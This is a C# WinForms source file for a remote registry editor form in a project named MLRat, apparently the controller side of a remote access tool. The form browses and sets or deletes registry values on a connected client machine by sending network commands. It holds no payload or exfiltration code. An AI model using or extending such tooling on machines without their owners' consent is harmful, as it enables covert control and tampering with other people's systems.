using MLManagementServer.CustomObjects;
using MLRat.Server;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MLManagementServer.Forms
{
    
    public partial class RegistryEditorForm : Form
    {
        public IClient Client { get; set; }
        TreeNode LoadingNode, UpdatingNode, CurrentUser, LocalMachine, UsersRoot, CurrentConfig;
        private bool IsLoading = false;
        public RegistryEditorForm(IClient _client)
        {
            InitializeComponent();
            Client = _client;
        }

        public void Destroy()
        {
            Dispose();
        }

        private void RegistryEditorForm_Load(object sender, EventArgs e)
        {
            LoadingNode = new TreeNode("Loading...");

            //ClassesRoot = SetupNode("HKEY_CLASSES_ROOT");
            CurrentUser = SetupNode("HKEY_CURRENT_USER");
            LocalMachine = SetupNode("HKEY_LOCAL_MACHINE");
            UsersRoot = SetupNode("HKEY_USERS");
            CurrentConfig = SetupNode("HKEY_CURRENT_CONFIG");

            LoadingNode.Tag = new RegistryNodeData();

            tvRegistryNavigator.BeforeExpand += TvRegistryNavigator_BeforeExpand;
            tvRegistryNavigator.BeforeCollapse += TvRegistryNavigator_BeforeCollapse;
            tvRegistryNavigator.AfterSelect += TvRegistryNavigator_AfterSelect;

            tvRegistryNavigator.Nodes.AddRange(new[] { CurrentUser, LocalMachine, UsersRoot, CurrentConfig });

        }

        private TreeNode SetupNode(string text)
        {
            TreeNode node = new TreeNode(text);
            node.Tag = new RegistryNodeData();
            node.Nodes.Add(new TreeNode());
            node.ContextMenuStrip = nodeContextMenu;
            return node;
        }

        void UpdateVauesFromRegistryData(RegistryNodeData data)
        {
            Invoke((MethodInvoker)delegate ()
            {
                lvKeyDisplay.Items.Clear();
                if (data.VauesDeniedAccess)
                {
                    lvKeyDisplay.View = View.List;
                    lvKeyDisplay.Items.Add("Access denied");
                }
                else
                {
                    lvKeyDisplay.View = View.Details;
                    foreach (var rgKey in data.Keys)
                    {
                        ListViewItem i = new ListViewItem(rgKey.Key);
                        i.SubItems.Add(rgKey.Value);
                        lvKeyDisplay.Items.Add(i);
                    }
                }
                string path = data.Path;
                if (path == string.Empty)
                    path = "\\";
                navLabel.Text = path;
            });
        }


        void LoadValues(TreeNode Node)
        {
            if (Node == null) return;
            if (IsLoading) return;
            RegistryNodeData data = (RegistryNodeData)Node.Tag;
            if (data.LoadedValues)
            {
                UpdateVauesFromRegistryData(data);
                return;
            }
            IsLoading = true;
            UpdatingNode = Node;
            TreeNode rootNode = GetRootNode(Node);

            Invoke((MethodInvoker)delegate ()
            {
                lvKeyDisplay.Items.Clear();
                lvKeyDisplay.View = View.List;
                lvKeyDisplay.Items.Add("Loading...");
            });

            RegistryKeyType key = keyFromNode(rootNode);
            Client.Send((byte)NetworkCommand.RegistryEdit, (byte)RegistryCommand.UpdateKeys, (byte)key, data.Path);
        }

        private void TvRegistryNavigator_AfterSelect(object sender, TreeViewEventArgs e)
        {
            LoadValues(e.Node);
        }

        private void TvRegistryNavigator_BeforeCollapse(object sender, TreeViewCancelEventArgs e)
        {
            RegistryNodeData data = (RegistryNodeData)e.Node.Tag;
            if (!data.LoadedNodes)
                e.Cancel = true;
        }

        public void UpdateValues(Dictionary<string, string> keys)
        {
            if (!IsLoading || keys == null || UpdatingNode==null)
                return;

            RegistryNodeData parentData = (RegistryNodeData)UpdatingNode.Tag;
            parentData.Keys = keys;
            parentData.LoadedValues = true;
            UpdateVauesFromRegistryData(parentData);
            IsLoading = false;
        }

        public void UpdateNode(string[] nodes)
        {
            if (!IsLoading || UpdatingNode == null)
                return;
            foreach(string n in nodes)
            {
                Invoke((MethodInvoker)delegate ()
                {
                    TreeNode tn = SetupNode(n);
                    RegistryNodeData nd = (RegistryNodeData)tn.Tag;
                    RegistryNodeData parentData = (RegistryNodeData)UpdatingNode.Tag;
                    if (parentData.Path == string.Empty)
                        nd.Path = n;
                    else
                        nd.Path = string.Format("{0}\\{1}", parentData.Path, n);
                    tn.Tag = nd;
                    UpdatingNode.Nodes.Add(tn);
                    UpdatingNode.Nodes.Remove(LoadingNode);
                    parentData.LoadedNodes = true;
                    IsLoading = false;
                });
            }
        }

        public void UpdateEmptyNode()
        {
            Invoke((MethodInvoker)delegate ()
            {
                UpdatingNode.Nodes.Remove(LoadingNode);
                RegistryNodeData parentData = (RegistryNodeData)UpdatingNode.Tag;
                parentData.LoadedNodes = true;
                IsLoading = false;
            });
        }

        private void nodeContextMenu_Opening(object sender, CancelEventArgs e)
        {
            
        }

        public void ValueDeniedAccess()
        {
            if (!IsLoading || UpdatingNode == null)
                return;

            Invoke((MethodInvoker)delegate ()
            {
                RegistryNodeData parentData = (RegistryNodeData)UpdatingNode.Tag;
                parentData.LoadedValues = true;
                parentData.VauesDeniedAccess = true;
                UpdateVauesFromRegistryData(parentData);
                IsLoading = false;
            });
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            TreeNode selectedNode = tvRegistryNavigator.SelectedNode;
            if (selectedNode != null)
            {
                RegistryNodeData data = (RegistryNodeData)selectedNode.Tag;
                data.LoadedNodes = false;
                selectedNode.Nodes.Clear();
                RefreshNode(selectedNode);
            }
        }

        private void refreshToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            TreeNode Node = tvRegistryNavigator.SelectedNode;
            if (Node != null)
            {
                RegistryNodeData data = (RegistryNodeData)Node.Tag;
                data.LoadedValues = false;
                LoadValues(Node);
            }
        }

        private void lvKeyDisplay_DoubleClick(object sender, EventArgs e)
        {
            TreeNode selectedNode = tvRegistryNavigator.SelectedNode;
            if (selectedNode == null)
                return;
            if (lvKeyDisplay.SelectedItems.Count < 1)
                return;
            if (lvKeyDisplay.View == View.List)
                return;
            string key = lvKeyDisplay.SelectedItems[0].Text;
            using (editRegistryKeyForm erkf = new editRegistryKeyForm(key))
            {
                if(erkf.ShowDialog() == DialogResult.OK)
                { 
                    RegistryKeyType regKey = keyFromNode(GetRootNode(selectedNode));
                    RegistryNodeData data = (RegistryNodeData)selectedNode.Tag;
                    Client.Send((byte)NetworkCommand.RegistryEdit, (byte)RegistryCommand.SetValue, (byte)regKey, data.Path, key, erkf.NewValue);
                    data.LoadedValues = false;
                    LoadValues(selectedNode);
                }
            }
        }

        TreeNode GetRootNode(TreeNode node)
        {
            TreeNode rnode = node;
            while (rnode.Parent != null)
            {
                rnode = rnode.Parent;
            }
            return rnode;
        }

        private void lvKeyDisplay_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void newToolStripMenuItem_Click(object sender, EventArgs e)
        {
            TreeNode selectedNode = tvRegistryNavigator.SelectedNode;
            if (selectedNode == null) return;
            if (lvKeyDisplay.View == View.List) return;
            using (addRegistryKeyForm arkf = new addRegistryKeyForm())
            {
                if (arkf.ShowDialog() == DialogResult.OK)
                {
                    RegistryKeyType regKey = keyFromNode(GetRootNode(selectedNode));
                    RegistryNodeData data = (RegistryNodeData)selectedNode.Tag;
                    Client.Send((byte)NetworkCommand.RegistryEdit, (byte)RegistryCommand.SetValue, (byte)regKey, data.Path, arkf.NewKey, arkf.NewValue);
                    data.LoadedValues = false;
                    LoadValues(selectedNode);
                }
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            TreeNode selectedNode = tvRegistryNavigator.SelectedNode;
            if (selectedNode == null)
                return;
            if (lvKeyDisplay.SelectedItems.Count < 1)
                return;
            if (lvKeyDisplay.View == View.List)
                return;
            string key = lvKeyDisplay.SelectedItems[0].Text;
            if(MessageBox.Show(string.Format("Delete the registry key {0}?", key), "Delete registry key", MessageBoxButtons.YesNo) == DialogResult.Yes)
            {
                RegistryKeyType regKey = keyFromNode(GetRootNode(selectedNode));
                RegistryNodeData data = (RegistryNodeData)selectedNode.Tag;
                Client.Send((byte)NetworkCommand.RegistryEdit, (byte)RegistryCommand.DeleteValue, (byte)regKey, data.Path, key);
                data.LoadedValues = false;
                LoadValues(selectedNode);
            }
        }

        bool RefreshNode(TreeNode Node)
        {
            if (Node.Equals(LoadingNode))
                return true;
            RegistryNodeData data = (RegistryNodeData)Node.Tag;
            if (!data.LoadedNodes)
            {
                if (IsLoading) return true;
                IsLoading = true;

                if(Node.Nodes.Count > 0)
                    Node.Nodes.Remove(Node.FirstNode);
                Node.Nodes.Add(LoadingNode);

                UpdatingNode = Node;

                TreeNode rootNode = GetRootNode(Node);
                

                RegistryKeyType key = keyFromNode(rootNode);

                Console.WriteLine("Root Node: {0}", rootNode.Text);

                string path = data.Path;

                Console.WriteLine("Node path: {0}", path);

                Client.Send((byte)NetworkCommand.RegistryEdit, (byte)RegistryCommand.UpdateNodes, (byte)key, path);

            }
            return false;
        }

        private void TvRegistryNavigator_BeforeExpand(object sender, TreeViewCancelEventArgs e)
        {
            e.Cancel = RefreshNode(e.Node);
        }

        RegistryKeyType keyFromNode(TreeNode node)
        {
            if (node.Equals(CurrentUser)) return RegistryKeyType.CurrentUser;
            if (node.Equals(LocalMachine)) return RegistryKeyType.LocalMachine;
           // if (node.Equals(ClassesRoot)) return RegistryKeyType.ClassesRoot;
            if (node.Equals(CurrentConfig)) return RegistryKeyType.CurrentConfig;
            if (node.Equals(UsersRoot)) return RegistryKeyType.UserRoot;
            return RegistryKeyType.None;
        }
    }

    public class NativeTreeView : TreeView
    {
        [DllImport("uxtheme.dll", CharSet = CharSet.Unicode)]
        private extern static int SetWindowTheme(IntPtr hWnd, string pszSubAppName,
                                                string pszSubIdList);

        protected override void CreateHandle()
        {
            base.CreateHandle();
            SetWindowTheme(this.Handle, "explorer", null);
        }
    }
}
